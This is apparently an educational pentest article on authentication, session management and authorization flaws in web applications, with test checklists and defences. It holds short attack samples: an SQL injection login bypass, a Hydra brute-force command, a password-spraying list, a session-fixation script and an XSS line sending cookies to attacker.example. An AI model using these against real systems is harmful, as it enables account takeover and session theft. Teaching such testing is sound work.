---
id: authentication-session-authorization-from-zero
title: "Authentication, session management, and authorization: who you are, how long we trust you, and what you are allowed to do"
team: red
domain: web-security
section: authentication-access-control
type: knowledge
angle: pentest-workflow
sourceTrack: baw
tags: ["authorization", "access-control", "idor", "brute-force", "2fa", "cookies", "web"]
difficulty: easy
shortDescription: "Authentication, sessions, and authorization are three different layers of access control. If you confuse their roles, you may build an application that logs users in correctly but still allows them to access places they should never reach."
updatedAt: "2026-04-30"
---

# Authentication, session management, and authorization: who you are, how long we trust you, and what you are allowed to do

Access control in a web application is not just a login form.

This is one of the biggest mistakes beginners make.

Many people see a login screen and think:

> “The application has login, so it is secured.”

The problem is that login is only the first part of the puzzle.

A secure application has to answer three different questions:

- **Who are you?**  
  This is authentication.

- **How does the application remember that you are already logged in?**  
  This is session management.

- **What are you allowed to do after logging in?**  
  This is authorization.

These three mechanisms are connected, but they are not the same thing.

That is exactly why an application can have a properly working login form and still be vulnerable to account takeover, user enumeration, Session Fixation, IDOR, privilege escalation, or access to other users’ data.

---

# 1. First, let’s organize the concepts

## Identification

Identification is the moment when the user tells the system:

> “This is probably me.”

Most often, this is done by providing:

- a username,
- an e-mail address,
- a customer number,
- an account name,
- an account identifier.

Identification alone does not confirm identity yet.

If I enter `admin@example.com`, the application only knows that I am trying to act as that user. It still does not know whether I really am that user.

---

## Authentication

Authentication is the process of confirming identity.

In other words, the application checks:

> “Do the provided credentials really match this user?”

Most commonly, it looks like this:

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

login=admin&password=SuperPassword123!
```

The application checks on the server side whether the provided username and password match the data stored in the database.

If they do, the user becomes authenticated.

One important thing to remember:

> Authentication confirms who the user is. It does not automatically decide what the user is allowed to do.

---

## Session management

HTTP is a stateless protocol.

This means that the server, by itself, does not remember that two consecutive requests came from the same user.

That is why web applications need sessions.

After successful authentication, the server usually sets a cookie:

```http
Set-Cookie: sessionid=99a2a12481509ff766f159c71ade9833de227d722f25a3f5be2674f5f628e494; Path=/; HttpOnly; Secure
```

The browser stores it and automatically sends it with future requests:

```http
Cookie: sessionid=99a2a12481509ff766f159c71ade9833de227d722f25a3f5be2674f5f628e494
```

From that moment, the application does not ask for the password on every click. Instead, it recognizes the user by the session identifier.

That is why the session identifier is critical.

If an attacker steals it, they often do not need to know the user’s password. It may be enough to place the stolen cookie in their own browser.

---

## Authorization

Authorization answers the question:

> “Is this logged-in user allowed to perform this specific action on this specific resource?”

This is a different problem than authentication.

A user may be correctly logged in, but that does not mean they can:

- access the administrator panel,
- download another user’s invoice,
- change an account role,
- read someone else’s support ticket,
- delete another person’s account,
- view resources assigned to another organization.

The simplest example:

```http
GET /invoices/123 HTTP/1.1
Host: example.com
Cookie: sessionid=...
```

The application must check not only:

> “Is the user logged in?”

but also:

> “Does this invoice belong to this user, or does this user have permission to view it?”

If the application only checks the first question, we have a classic authorization flaw.

---

# 2. Bug versus security bug

Not every application bug is a vulnerability.

A typo, a broken margin, or an inconvenient form may be bugs, but they do not necessarily violate security.

A bug becomes a security bug when it violates one of the pillars of information security.

Most often, we talk about the CIA triad:

## Confidentiality

Are data accessible only to people who should have access to them?

Example violations:

- a user can see another user’s invoice,
- a password reset token leaks in the `Referer` header,
- an API returns another customer’s data.

## Integrity

Can data be modified only by people who should have permission to modify them?

Example violations:

- a regular user changes their account role to administrator,
- an attacker modifies someone else’s order,
- a user can replace the account identifier in a password reset request.

## Availability

Are the system and data available when they should be?

Example violations:

- an account lockout mechanism allows all users to be locked out,
- poorly designed brute-force protection causes Denial of Service,
- an attacker can mass-invalidate active sessions.

Two additional concepts often appear here as well:

## Accountability

Can we determine who did what and when?

## Non-repudiation

Can a user deny that they performed a specific operation?

In practice, if a bug affects confidentiality, integrity, availability, accountability, or non-repudiation, we start talking about a security vulnerability.

---

# 3. Authentication models in web applications

Authentication can be implemented in many ways.

A tester should be able to recognize which mechanism is being used because the testing approach depends on it.

---

## Classic form-based login and session

This is the most common model in web applications.

The user provides a username and password:

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

login=admin&password=sekurak
```

If the credentials are correct, the application returns a session cookie:

```http
Set-Cookie: sessionid=abc123...; Path=/; HttpOnly; Secure
```

From that moment, the cookie is proof that the user has passed the authentication process.

This means that when testing the application, you need to look not only at `/login`, but also at:

- the quality of the session cookie,
- cookie flags,
- session regeneration after login,
- logout,
- session lifetime,
- parallel sessions,
- the “remember me” feature.

---

## HTTP Basic Authentication

This mechanism uses the `Authorization` header.

Example:

```http
GET /resource/1 HTTP/1.1
Host: example.com
Authorization: Basic YWRtaW46c2VrdXJhaw==
```

The value after `Basic` is Base64 of the following string:

```text
username:password
```

For example:

```text
admin:sekurak
```

Important: Base64 is not encryption.

If HTTP Basic Authentication works without HTTPS, credentials can be easily intercepted.

---

## Bearer token and OpenID Connect

In API applications, we often see a token sent in a header:

```http
GET /resource/1 HTTP/1.1
Host: example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

This is often a JWT used in the context of OpenID Connect or OAuth 2.0.

In this case, testing includes, among other things:

- whether the token can be replaced,
- whether the token expires,
- whether the token signature is verified,
- whether the application accepts weak algorithms,
- whether roles and permissions from the token are blindly trusted,
- whether old endpoints allow additional verification to be bypassed.

---

## API keys

In APIs, you can often see something like this:

```http
GET /resource/1 HTTP/1.1
Host: example.com
X-API-Key: d6f4b6f0ff198f4700daa66433230164c1e21323d661a25b561d8a96
```

An API key may act as:

- the main credential,
- an additional access control factor,
- a client application identifier,
- a limiter for access to a specific API scope.

Typical mistakes:

- keys stored in frontend code,
- keys in public repositories,
- no key rotation,
- one key used across multiple environments,
- no permission scoping for the key,
- no logging of key usage.

---

## Client certificate

In corporate environments, certificate-based authentication may appear.

The server requires the client to present a valid certificate. If the certificate is trusted, access is granted.

This solution is convenient for organizations, but it requires a good process for:

- issuing certificates,
- revoking certificates,
- rotation,
- protecting endpoint devices,
- controlling who actually owns the certificate.

---

## Kerberos and NTLM

In Windows and Active Directory environments, Kerberos and NTLM are often encountered.

From the perspective of web security, the important part is that the application may authenticate the user automatically based on the domain context.

During tests with Burp Suite, remember that intercepting and replaying such requests may require additional proxy configuration, especially with Kerberos.

---

# 4. Authentication - typical mistakes and way of thinking

## No HTTPS when sending credentials

If the application sends a username, password, token, or session identifier over HTTP, this is a fundamental flaw.

Credentials should be sent only through an encrypted channel.

Bad situation:

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

login=admin&password=SuperPassword123!
```

if it happens over plain HTTP.

The padlock in the browser does not automatically mean the application is secure, but lack of HTTPS during login should immediately raise a red flag.

During testing, it is worth checking:

```bash
sslscan example.com
```

or:

```bash
testssl.sh https://example.com
```

What to look for:

- whether the application enforces HTTPS,
- whether it also works over HTTP,
- whether cookies have the `Secure` flag,
- whether old TLS versions are disabled,
- whether weak cipher suites are supported.

---

## No authentication where authentication should be required

This is one of the simplest and most dangerous flaws.

Example request from a logged-in user:

```http
GET /admin/delete_user/1 HTTP/1.1
Host: example.com
Cookie: sessionid=aa4d8eda8db4950bba1db57f383f46cf
```

The test is to remove the cookie:

```http
GET /admin/delete_user/1 HTTP/1.1
Host: example.com
```

If the application still performs the action, the endpoint does not require authentication.

This is not a minor bug.

It means that a critical function is available anonymously.

In practice, when testing an application, it is worth checking:

- administrator endpoints,
- API endpoints,
- data export endpoints,
- file download endpoints,
- old paths,
- technical panels,
- `/debug`,
- `/admin`,
- `/internal`,
- `/api/v1`,
- `/api/v2`,
- `/backup`,
- `/uploads`,
- configuration files,
- database panels,
- Elasticsearch, Redis, MongoDB, and similar services exposed to the Internet.

---

## Authentication bypass through SQL Injection

A login mechanism often checks data in a database.

Example logic:

```sql
SELECT 1 FROM users WHERE login='<login>' AND password='<pass>';
```

If the application builds the query through concatenation, the `login` parameter may allow SQL Injection.

Classic payload:

```text
admin' --
```

The query may then look like this:

```sql
SELECT 1 FROM users WHERE login='admin' --' AND password='<pass>';
```

The password part becomes commented out.

Effect: the application may decide that the user provided correct credentials.

Of course, in real tests, the payload must be adapted to:

- the database type,
- the context,
- the way the query is built,
- filters,
- the comment syntax,
- whether the application hashes the password before comparison.

The most important lesson:

> A login form is also user input. It is not magically safe just because it is used for login.

Correct implementation should use parameterized queries.

---

## Authentication bypass through a logic flaw

Not every login bypass comes from SQL Injection.

Sometimes the problem is application logic.

Example way of thinking:

- the application treats paths starting with `/public/` as public,
- paths starting with `/admin/` as protected,
- but it does not correctly normalize paths containing `../`.

Then something like this may be a problem:

```http
GET /public/../admin/config HTTP/1.1
Host: example.com
```

If the application only checks the beginning of the path, it may incorrectly treat the resource as public.

This is an important class of bugs:

> The application makes a security decision based on data that can be bypassed, normalized, or interpreted differently by a later layer.

---

## Credentials served on a plate

Sometimes there is no need to bypass login.

It is enough to find credentials.

Typical places:

- HTML comments,
- JavaScript files,
- public repositories,
- `.env` files,
- backups,
- configuration files,
- technical documentation,
- Docker images,
- Git history,
- logs,
- manufacturer default passwords,
- test accounts left on production.

Example in HTML:

```html
<!-- test user: admin / admin123 -->
```

Example in JavaScript:

```javascript
const API_KEY = "prod_1234567890abcdef";
```

Example in a `.env` file:

```env
DB_USER=admin
DB_PASSWORD=SuperSecretPassword
```

From a tester’s perspective, it is always worth checking:

```bash
curl -sk https://example.com/login | grep -iE "pass|password|admin|test|todo|debug"
```

and frontend sources:

```bash
curl -sk https://example.com/assets/app.js | grep -iE "token|key|secret|password|admin|debug"
```

---

## Security decisions on the frontend side

The frontend is an untrusted environment.

The fact that a button is not visible in the interface does not mean the function is secured.

Bad logic:

```javascript
if (user.role === "admin") {
  showAdminPanel();
}
```

This may be acceptable as an interface element, but never as the actual security mechanism.

An attacker does not need to click the button.

They can send the request manually:

```http
POST /admin/change-role HTTP/1.1
Host: example.com
Cookie: sessionid=...

user_id=123&role=admin
```

Real control must happen on the server side.

The backend must check:

- who is making the request,
- what role they have,
- whether they are allowed to perform this action,
- whether they are allowed to access this specific resource,
- whether the operation requires additional authorization.

---

## User enumeration

The login mechanism may reveal whether an account exists.

Bad example:

```text
User not found.
```

for a non-existing username.

And:

```text
Incorrect password.
```

for an existing username.

An attacker can test a list of e-mail addresses and build a database of users.

A better message:

```text
Incorrect username or password.
```

The same message should be used regardless of whether:

- the username does not exist,
- the password is wrong,
- the account is inactive,
- the account is deleted,
- the account is locked.

But the message is not everything.

Enumeration may also come from response time differences.

Example:

- for a non-existing user, the application responds in 20 ms,
- for an existing user, the application calculates a password hash and responds in 400 ms.

An attacker may not see any difference in the response body, but they will see the difference in timing.

---

## Brute-force and dictionary attacks

If the application allows unlimited login attempts, the attack can be automated.

Hydra example:

```bash
hydra example.com -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:login=^USER^&password=^PASS^:Wrong password"
```

This attack is conceptually very simple:

- the same username,
- many passwords,
- observation of the application response,
- detection of the moment when the error message disappears or the response changes.

But there is also an inverse variant.

Instead of:

```text
one username + many passwords
```

the attacker may use:

```text
one password + many usernames
```

This is often called password spraying.

Example:

- `Winter2026!`
- `Company2026!`
- `Password123!`
- `Welcome1!`

If the organization has many users, there is a chance that someone uses one of those passwords.

---

## Mistakes in brute-force protection

Brute-force protection can also be implemented incorrectly.

### Mistake 1: attempt counter stored in the session

If the application stores the number of failed attempts in the session, the attacker can simply avoid sending the session cookie back.

Then every request looks like a new session to the application.

This bypasses the counter.

### Mistake 2: CAPTCHA only on the frontend

If the application displays CAPTCHA but does not verify it on the server side, the protection does not exist.

A tester should check whether CAPTCHA parameters can be removed from the request.

### Mistake 3: CAPTCHA with a user-controlled identifier

If the request contains something like:

```http
captcha_id=123&captcha_value=ABCD
```

and the user controls `captcha_id`, they may try to reuse the same known code repeatedly.

### Mistake 4: hard account lockout

Locking an account after a few failed attempts may look good, but it can create a Denial of Service issue.

The attacker takes a list of users and intentionally enters the wrong password a few times for each account.

Effect:

- accounts are locked,
- users cannot work,
- the helpdesk is flooded with tickets.

A better approach is layered protection:

- delays,
- CAPTCHA after several attempts,
- per-account limits,
- per-IP address limits,
- reputation analysis,
- device cookie,
- soft lock instead of hard lock,
- user notification,
- operator alerting.

---

## Password reset

Password reset is part of the authentication mechanism.

Very often, it is weaker than login itself.

Bad practice:

```text
We will send you your current password by e-mail.
```

If the application can send the current password, it probably stores it in reversible or plaintext form.

The correct model is reset, not reminder.

A secure process should look like this:

1. The user provides an e-mail address.
2. The application always displays a generic message.
3. If the account exists, the application generates a random token.
4. The token is stored on the server side.
5. The e-mail contains a link with the token.
6. The token has a short lifetime.
7. The token is single-use.
8. After use, the token is invalidated.
9. The user sets a new password.
10. Optionally, the application invalidates the user’s active sessions.

Generic message:

```text
If the provided address exists in the system, we will send password reset instructions to it.
```

There should not be two different messages:

```text
User does not exist.
```

and:

```text
Message sent.
```

because that allows account enumeration.

---

## Password reset token leakage

A password reset token is almost as sensitive as a password.

If the token leaks, the attacker may take over the account.

Typical leakage channels:

- `Referer` header,
- external analytics scripts,
- server logs,
- browser history,
- monitoring systems,
- screenshots,
- proxies,
- analytics tools.

Bad example:

```text
https://example.com/reset?token=abc123
```

If the reset page loads an external resource, the browser may send the header:

```http
Referer: https://example.com/reset?token=abc123
```

That is why you must be careful about what the password reset page loads.

---

## Reset takeover by changing the user identifier

A very dangerous bug appears when the application trusts a user identifier sent from the form.

Example:

```http
POST /reset-password HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

token=VALID_TOKEN_ATTACKER&user_id=123&new_password=NewPassword123!
```

If the token belongs to the attacker, but the attacker changes `user_id` to the victim’s identifier, the application must not allow the victim’s password to be changed.

Correct logic:

- the reset token must be linked to a specific user on the server side,
- the user must not decide whose password is being reset,
- the application should determine the user from the token, not from a request parameter.

---

## Security questions

Security questions are a weak mechanism.

Examples:

- name of your first pet,
- mother’s maiden name,
- favorite sport,
- city of birth,
- name of your best friend.

Problem: answers can often be found through Open-Source Intelligence or guessed.

Second problem: answers are another form that may have its own vulnerabilities:

- brute-force of answers,
- enumeration of correct answers,
- SQL Injection,
- no attempt limit,
- different error messages.

If the application does not need security questions, it is better not to implement them.

---

## Re-authentication for critical actions

Being logged in should not always be enough.

For critical operations, the application should require identity confirmation again.

Examples:

- changing password,
- changing e-mail address,
- changing phone number,
- disabling two-factor authentication,
- changing payout details,
- adding a new device,
- changing administrator settings,
- deleting an account,
- generating a new API key.

Example of correct logic:

> The user is logged in, but before changing the password, they must provide the current password.

Important: the re-authentication form must have the same level of protection as the main login form.

This means it should also be protected against brute-force attacks.

---

## Password storage hygiene

Passwords should not be stored in plaintext.

They also should not be stored using regular symmetric encryption.

The correct practice is to store the output of a special function designed for passwords.

Most commonly:

- Argon2,
- bcrypt,
- PBKDF2 in specific environments.

Incorrect approach:

```text
password = "SuperPassword123!"
```

Incorrect approach:

```text
password = AES_ENCRYPT("SuperPassword123!", key)
```

Better approach:

```text
password_hash = Argon2id(password, salt, parameters)
```

During login, the application does not decrypt the password.

The application calculates the hash of the provided password and compares it with the stored hash.

---

## Password policy

A password policy should help the user create strong passwords, but it should not be a blind ritual.

In practice, it is worth considering:

- minimum length,
- blocking popular passwords,
- blocking passwords from leaks,
- allowing long passwords,
- no artificially low maximum length,
- support for password managers,
- no absurd rules that lead to predictable passwords.

Forcing periodic password changes is debatable.

If a user has to change their password every month, it often ends like this:

```text
Password2026!01
Password2026!02
Password2026!03
```

A better approach is to require a change when:

- the password has leaked,
- account compromise is suspected,
- the user initiates the change,
- an administrator resets access,
- suspicious login is detected.

---

# 5. Session management - typical mistakes and way of thinking

## Do not invent your own session mechanism

A custom session mechanism is usually asking for trouble.

If the framework has a mature session management mechanism, it is usually better to use it than to build your own token, your own encryption, and your own logic.

Bad idea:

```text
cookie = AES(user_id + ":" + role + ":" + timestamp)
```

Why?

Because you need to solve correctly:

- encryption,
- integrity,
- key rotation,
- token expiration,
- invalidation,
- replay protection,
- permission changes,
- logout,
- parallel sessions,
- token theft.

This is harder than it looks.

---

## Regenerating the session identifier after login

The application should regenerate the session identifier whenever the user’s privilege level changes.

The most important moment: after successful login.

Correct scenario:

1. The user enters anonymously.
2. The application assigns an anonymous session.
3. The user logs in.
4. The application assigns a new session identifier.
5. The old identifier becomes useless.

The response after login should contain a new cookie:

```http
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: sessionid=NEW_RANDOM_SESSION_ID; Path=/; HttpOnly; Secure
```

If the session identifier does not change after login, Session Fixation should be tested.

---

## Session Fixation

Session Fixation happens when the attacker knows or forces a session identifier that the victim later uses.

Scenario:

1. The attacker obtains the victim’s anonymous session identifier or forces their own.
2. The victim logs in.
3. The application does not regenerate the session identifier.
4. The same identifier becomes the session of the logged-in user.
5. The attacker uses the known identifier and takes over the account.

Variant through URL:

```text
https://example.com/login?PHPSESSID=known_session_id
```

Variant through JavaScript in an XSS scenario:

```html
<script>
  document.cookie = "JSESSIONID=known_session_id";
</script>
```

Main defenses:

- regenerate the session after login,
- do not accept session identifiers from the URL,
- set `HttpOnly`,
- protect the application against XSS and HTML Injection.

---

## Parallel sessions

An application may allow multiple active sessions for one user.

This is not always a bug.

But the application should make a conscious design decision.

In less critical systems, multiple sessions may be allowed, but it is good to show the user:

- active sessions,
- IP addresses,
- devices,
- last activity,
- option to log out other sessions.

In critical systems, the number of sessions can be limited, but caution is needed.

If every new session automatically invalidates the old one, an attacker who obtains the password may cut off the real user.

That is why critical operations such as “log out other devices” should require additional authorization.

---

## Protecting the session cookie

The cookie containing the session identifier should have proper flags.

Example:

```http
Set-Cookie: sessionid=abc123; Path=/; HttpOnly; Secure; SameSite=Lax
```

## HttpOnly

Protects the cookie from being read by JavaScript.

Without `HttpOnly`, XSS can do:

```javascript
fetch("https://attacker.example/steal?c=" + document.cookie);
```

With `HttpOnly`, JavaScript cannot read the cookie.

Note: `HttpOnly` does not protect against all consequences of XSS. XSS can still perform actions as the user. But it makes stealing the session identifier harder.

## Secure

Makes the browser send the cookie only over HTTPS.

Without `Secure`, the cookie may be sent over HTTP.

## SameSite

Helps reduce the risk of Cross-Site Request Forgery.

Most common values:

```text
SameSite=Lax
SameSite=Strict
SameSite=None; Secure
```

`SameSite` does not replace Cross-Site Request Forgery tokens in every situation, but it is an important protection layer.

---

## The session identifier should not be in the URL

Bad example:

```text
https://example.com/account?PHPSESSID=abc123
```

Why is this a problem?

Because the session identifier may end up in:

- server logs,
- browser history,
- the `Referer` header,
- analytics systems,
- screenshots,
- e-mails,
- messengers.

Example leak through `Referer`:

```http
GET /jquery.js HTTP/1.1
Host: cdn.example.net
Referer: https://example.com/account?PHPSESSID=abc123
```

The session should be sent in a cookie, not in the URL.

---

## Proper length and entropy of the session identifier

The session identifier must be hard to guess.

It is not enough that it “looks random.”

Bad example:

```text
sessionid=10001
sessionid=10002
sessionid=10003
```

Bad example:

```text
sessionid=user_123_admin
```

Better example:

```text
sessionid=99a2a12481509ff766f159c71ade9833de227d722f25a3f5be2674f5f628e494
```

In practice, it is worth checking:

- length,
- randomness,
- repetition,
- predictability,
- whether the identifier contains user data,
- whether the identifier is a Base64-encoded JSON object.

Burp Suite has the Sequencer module for this.

---

## Session lifetime

A session should not live forever.

It is worth distinguishing two concepts.

## Inactivity timeout

Time since the user’s last activity.

Example:

> If the user does nothing for 15 minutes, the session expires.

This reduces the risk that someone approaches an unlocked computer and uses the active session.

## Maximum session lifetime

Time since the session was created.

Example:

> The session expires after a maximum of 8 hours, even if the user keeps clicking.

This reduces the risk of long-term use of a stolen session identifier.

Good applications use both limits.

---

## Logout must invalidate the session on the server side

Logout cannot only hide the interface or remove the cookie in the browser.

Correct logout should:

- invalidate the session on the server side,
- remove the cookie from the browser,
- prevent reuse of the old identifier.

Test:

1. Log in.
2. Copy the session cookie.
3. Log out.
4. Send a request with the previous cookie.
5. Check whether the application still accepts the session.

If the old session still works, logout is flawed.

---

## Cookie name as fingerprinting

The default cookie name may reveal the technology.

Examples:

```text
PHPSESSID
JSESSIONID
ASP.NET_SessionId
```

This is usually not a critical vulnerability, but it may help identify the technology.

Sometimes it is worth changing the name to something more generic:

```text
sessionid
session
sid
```

This is not a primary defense, but it is part of reducing information disclosed by the application.

---

## The problematic “remember me” feature

“Remember me” is convenient, but hard to implement safely.

Worst variant:

```http
Set-Cookie: remember_login=admin
Set-Cookie: remember_password=SuperPassword123!
```

This is critically bad.

A slightly better variant:

```http
Set-Cookie: remember_token=random_token
```

But the token itself also has to be handled correctly.

A good implementation should:

- generate a random token,
- store the token on the server side in a secure form,
- bind the token to the user,
- set `HttpOnly`,
- set `Secure`,
- set a reasonable lifetime,
- rotate the token after use,
- invalidate the old token,
- invalidate the token on logout,
- allow the user to remove remembered devices.

Important mindset:

> A “remember me” token is an alternative credential. Treat it almost like a password.

---

# 6. Authorization - the most commonly underestimated layer

Authentication says:

> “This is Maciek.”

Authorization says:

> “Can Maciek see this invoice, modify this resource, or perform this action?”

This is the key distinction.

An application may have excellent login, good password hashing, correct cookies, and two-factor authentication, and still allow a logged-in user to download someone else’s data.

---

## Vertical authorization

Vertical authorization concerns privilege levels.

Example:

- regular user,
- moderator,
- administrator,
- super administrator.

A bug appears when a lower-privileged user can perform an action intended for a higher-privileged role.

Example:

```http
POST /admin/users/123/delete HTTP/1.1
Host: example.com
Cookie: sessionid=user_session
```

If a regular user can delete another user’s account, we have vertical privilege escalation.

---

## Horizontal authorization

Horizontal authorization concerns resources belonging to users with the same privilege level.

Example:

```http
GET /tickets/1001 HTTP/1.1
Host: example.com
Cookie: sessionid=user_A
```

User A can see their own ticket.

They change the identifier:

```http
GET /tickets/1002 HTTP/1.1
Host: example.com
Cookie: sessionid=user_A
```

If they can see user B’s ticket, we have a horizontal authorization flaw.

This is often called:

- IDOR,
- Insecure Direct Object Reference,
- Broken Object Level Authorization,
- BOLA.

The most important lesson:

> The fact that a user is logged in does not mean they can access any resource by identifier.

---

## Authorization at the interface layer

This is a very common mistake.

The application does not show the user a “Delete” button, but the endpoint still works.

Frontend:

```html
<!-- button visible only to admin -->
```

Backend:

```http
POST /admin/delete-user HTTP/1.1
Host: example.com
Cookie: sessionid=normal_user

user_id=123
```

If the backend does not check permissions, hiding the button means nothing.

A tester should think like this:

> I am not asking whether the application shows me the function. I am asking whether the backend allows me to execute it.

---

## Global resource identifiers

If the application uses simple identifiers, a tester should immediately check authorization.

Examples:

```text
/invoice/1
/invoice/2
/invoice/3
```

```text
/api/orders/1001
/api/orders/1002
```

```text
/download?file_id=55
```

The test is to change the identifier.

If the user sees:

```http
GET /api/invoices/123 HTTP/1.1
```

check:

```http
GET /api/invoices/124 HTTP/1.1
```

But important:

> UUID does not solve the authorization problem.

Example:

```text
/invoice/584c7ffa-6a1e-4167-9f29-0abc3bedc223
```

UUIDs are harder to guess, but they can leak.

They may appear in:

- logs,
- history,
- `Referer`,
- API,
- HTML,
- JavaScript,
- GraphQL responses,
- exports,
- error dumps,
- links sent by e-mail.

That is why the application still has to check permissions on the server side.

---

## The user must not decide their own permissions

Bad example:

```http
Cookie: isAdmin=0
```

The attacker changes it to:

```http
Cookie: isAdmin=1
```

If the application trusts this value, we have privilege escalation.

Similar risky parameters:

```http
role=admin
```

```http
is_admin=true
```

```http
user_type=superuser
```

```http
access_level=10
```

```http
plan=premium
```

```http
organization_id=2
```

Not every such parameter automatically means a vulnerability, but each one should trigger a test:

> Does the backend trust a value sent by the user?

Authorization decisions should come from server-side data, not from parameters controlled by the client.

---

## Central authorization mechanism

The worst model is one where every endpoint manually checks permissions in a different way.

Then it is enough for one developer to forget one check.

A better model:

- central authorization layer,
- everything blocked by default,
- explicitly defined permissions,
- one way to check access,
- automated tests for access control,
- logging of authorization decisions.

Good rule:

> Every operation on a protected resource must pass through authorization control.

Not only HTML views.

Also:

- APIs,
- exports,
- file downloads,
- PDF previews,
- mobile endpoints,
- old API versions,
- webhooks,
- internal panels,
- debug endpoints,
- import and export functions.

---

## Accountability and operation logging

The application should log important operations.

Especially:

- successful login,
- failed login,
- password reset,
- password change,
- e-mail address change,
- role change,
- access to sensitive data,
- failed authorization attempts,
- administrator operations,
- API key generation,
- disabling two-factor authentication.

A log should allow you to answer:

- who performed the action,
- when,
- from what IP address,
- on which resource,
- with what result,
- whether the operation was blocked,
- whether it required additional authorization.

But note: data from headers such as `User-Agent` and `Referer` are controlled by the user.

If the application later displays them in an administrator panel, you must be careful about Stored XSS.

---

## Critical operations and additional authorization

Some operations should require more than an active session.

Examples:

- money transfer,
- phone number change,
- e-mail address change,
- disabling two-factor authentication,
- adding a new administrator,
- changing security configuration,
- resetting another user’s password,
- generating a new secret,
- deleting data.

Additional authorization may use:

- password,
- one-time code,
- mobile application,
- hardware key,
- confirmation outside the main channel.

Important: the second channel should not be the same channel that may already be compromised.

If the user operates through a browser, confirmation in a mobile application is stronger than another click in the same browser.

---

## Access control models

The most common model in web applications is RBAC.

## RBAC - Role-Based Access Control

Example:

- `user`,
- `moderator`,
- `admin`.

The role defines the set of allowed actions.

## DAC - Discretionary Access Control

The owner of a resource can grant access to others.

Example:

- sharing a document with another user,
- granting someone edit rights,
- inviting someone to a project.

## MAC - Mandatory Access Control

Permissions come from central policies and security labels.

This is more common in systems with high security requirements than in typical web applications.

---

## Principle of least privilege

A user should have only the permissions they need.

Nothing more.

This applies to:

- users,
- administrators,
- technical accounts,
- API keys,
- tokens,
- internal services,
- databases,
- CI/CD accounts.

Example of bad practice:

> Every employee has administrator privileges because it is more convenient.

Example of better practice:

> The user’s role follows real responsibilities, is reviewed periodically, and is removed when no longer needed.

---

# 7. Two-factor authentication

Two-factor authentication significantly improves security, but it is not a magic shield.

It is another mechanism that may also have bugs.

Classic authentication factors:

## Knowledge

Something the user knows.

Example:

- password,
- PIN.

## Possession

Something the user has.

Example:

- phone,
- code-generating application,
- hardware key,
- token.

## Inherence

Something the user is.

Example:

- fingerprint,
- face,
- biometrics.

The most common two-factor authentication model is:

```text
password + one-time code
```

---

## Typical bugs in two-factor authentication

It is worth checking:

- whether the code can be brute-forced,
- whether the code expires,
- whether the code is single-use,
- whether the verification step can be skipped,
- whether old endpoints allow login without the second factor,
- whether the second factor can be disabled without confirmation,
- whether the password reset mechanism bypasses the second factor,
- whether “remember this device” is implemented correctly,
- whether backup codes are protected properly,
- whether API responses reveal which stage the user has passed.

Example of flawed flow:

1. The user provides username and password.
2. The application creates a full session.
3. Only then does it display the one-time code form.
4. But API endpoints already work with that session.

In that case, the second factor can be bypassed by simply not completing the interface flow and manually querying the API.

Correct logic:

- after the password, the user is in an intermediate state,
- the full session is created only after the correct second factor,
- protected endpoints require a full authentication level.

---

# 8. How to test these mechanisms in practice

Below is a practical testing mindset.

---

## Authentication tests

Check:

- whether login requires HTTPS,
- whether the form is resistant to SQL Injection,
- whether messages prevent user enumeration,
- whether response time reveals account existence,
- whether there is a login attempt limit,
- whether brute-force protection is not based only on the session,
- whether CAPTCHA is verified on the server side,
- whether password reset does not reveal accounts,
- whether the reset token is single-use,
- whether the reset token expires,
- whether the user identifier can be changed during reset,
- whether critical actions require re-authentication,
- whether passwords are stored as hashes,
- whether the application allows weak passwords,
- whether default accounts are disabled or force password change.

---

## Session tests

Check:

- whether the session identifier changes after login,
- whether the session is invalidated after logout,
- whether the old cookie works after logout,
- whether the cookie has `HttpOnly`,
- whether the cookie has `Secure`,
- whether the cookie has reasonable `SameSite`,
- whether the session identifier is not in the URL,
- whether the session identifier does not appear in HTML,
- whether the session identifier has proper length,
- whether the identifier is not predictable,
- whether the application supports parallel sessions,
- whether the user can see active sessions,
- whether “remember me” does not store the username and password,
- whether the “remember me” token is rotated,
- whether the session expires after inactivity,
- whether the session has a maximum lifetime.

---

## Authorization tests

Check:

- whether every endpoint requires login where it should,
- whether a regular user can access administrator endpoints,
- whether changing a resource identifier gives access to other users’ data,
- whether `user_id`, `account_id`, `organization_id` can be changed,
- whether `role`, `is_admin`, `access_level` can be changed,
- whether hidden frontend functions are protected on the backend,
- whether the mobile API has the same rules as the web application,
- whether data export checks permissions,
- whether file download checks the resource owner,
- whether administrator actions are logged,
- whether blocked access attempts are logged,
- whether critical operations require additional authorization,
- whether the application follows the principle of least privilege.

---

# 9. The most important mistakes to remember

## 1. Authentication is not authorization

A logged-in user should not automatically have access to everything.

## 2. The frontend is not a security mechanism

A hidden button is only a hidden button.

The backend must check permissions.

## 3. The session identifier is like a temporary password

Whoever has the session often has the account.

That is why it must be protected.

## 4. Password reset is sometimes weaker than login

If reset is implemented incorrectly, the attacker does not need to know the password.

They can simply change it.

## 5. UUID does not replace authorization

A hard-to-guess identifier is not the same as access control.

## 6. Brute-force protection can also be broken

Poorly designed account lockout can become Denial of Service.

## 7. “Remember me” is an alternative credential

If a long-term token leaks, the user may be taken over without a password.

## 8. Security decisions must happen on the server side

Everything controlled by the user can be modified.

---

# 10. Minimal mental model for a pentester

During tests, ask yourself three questions.

## Who am I?

Does the application correctly confirm identity?

Here you test authentication.

## How does the application know it is still me?

Is the session created, stored, renewed, and invalidated securely?

Here you test session management.

## What am I allowed to do?

Does the application check permissions for every action and every resource?

Here you test authorization.

If you want to find access control bugs, do not start with payloads.

Start with an application map:

- what roles exist,
- what resources exist,
- what actions exist,
- what identifiers appear in the URL and request body,
- where the frontend hides functions,
- where the API returns more than it should,
- where the application trusts client-side parameters,
- where an old endpoint may have weaker control.

Only then test specific hypotheses.

---

# 11. Checklist: authentication

- Are all credentials sent over HTTPS?
- Does the application enforce HTTPS?
- Is the login form resistant to SQL Injection?
- Are error messages generic?
- Does response time prevent account enumeration?
- Is there brute-force protection?
- Is brute-force protection not based only on the session?
- Is CAPTCHA, if present, verified on the server side?
- Does the application protect against password spraying?
- Does password reset avoid revealing whether an account exists?
